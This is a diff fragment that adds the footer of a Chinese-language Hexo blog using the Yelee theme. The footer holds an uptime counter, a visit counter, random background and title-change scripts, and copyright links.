+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2024 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+
+    <div class="visit">
+        
+            <span id="busuanzi_container_site_pv" style='display:inline'>
+                <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                </span>
+            </span>
+        
+        
+            <span>| </span>
+        
+        
+            <span id="busuanzi_container_page_pv" style='display:inline'>
+                <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                </span>
+            </span>
+        
+    </div>
+
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  </div>
+
+
+</body>
+</html>
